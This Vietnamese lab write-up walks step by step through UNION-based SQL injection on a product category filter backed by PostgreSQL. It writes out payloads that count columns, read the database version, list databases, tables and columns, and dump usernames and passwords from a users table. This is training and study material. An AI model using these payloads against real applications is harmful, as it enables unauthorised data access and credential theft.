# Triển khai Lap
###### Trong các phòng thí nghiệm trước, chúng ta nhận thấy rằng bộ lọc danh mục sản phẩm dễ bị tấn công bởi SQL injection và truy vấn đang được phản ánh tới phản hồi của ứng dụng.
######  liệt kê số lượng cột trong bảng này thông qua mệnh đề UNION
###### `' UNION SELECT NULL,NULL,NULL-- -`
![alt text](image.png)
###### Khi chúng ta cố gắng chọn 3 cột, nó sẽ trả về trạng thái HTTP Lỗi máy chủ nội bộ 500, có nghĩa là bảng cơ sở dữ liệu này không có 3 cột.
###### thử với 2 cột.`' UNION SELECT NULL,NULL-- -`
![alt text](image-1.png)
###### ===>Không xuất hiện lỗi suy ra có 2 cột.
######  liệt kê cột nào chấp nhận kiểu dữ liệu chuỗi:`' UNION SELECT 'SQL Injection 1','SQL Injection 2'-- -`
![alt text](image-2.png)
###### Chúng ta có thể thấy rằng tất cả các cột đều chấp nhận kiểu dữ liệu chuỗi!
##### First column: Header
##### Second column: article content
######  tìm hiểu DBMS (Hệ thống quản lý cơ sở dữ liệu) nào đang sử dụng.`' UNION SELECT NULL,version()-- -`
![alt text](image-3.png)
###### Thông tin DBMS: PostgreSQL phiên bản 12.20
###### Mặc dù nền tảng lab đã cung cấp cho chúng ta tên bảng và tên cột, nhưng tôi muốn thực hành chèn SQL mà không cần bất kỳ thông tin nào trước.
###### liệt kê dữ liệu bảng hiện tại!
###### `' UNION SELECT NULL,datname FROM pg_database-- -`
![alt text](image-4.png)
###### ===>Databases: template1, academy_labs, postgres, template0
###### Có vẻ như Academy_labs là cơ sở dữ liệu hiện tại của chúng ta? Và kiểm tra xem nó có đúng không:`' UNION SELECT NULL,current_database()-- -`
![alt text](image-5.png)
###### liệt kê tất cả các tên bảng trong cơ sở dữ liệu này!
###### `' UNION SELECT NULL,table_name FROM information_schema.tables-- -`
![alt text](image-6.png)
![alt text](image-7.png)
![alt text](image-8.png)
######  liệt kê tên cột user
###### `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -`
![alt text](image-9.png)
###### liệt kê tất cả dữ liệu trong bảng này!
###### `' UNION SELECT username,password FROM users-- -`
![alt text](image-10.png)
![alt text](image-11.png)
![alt text](image-12.png)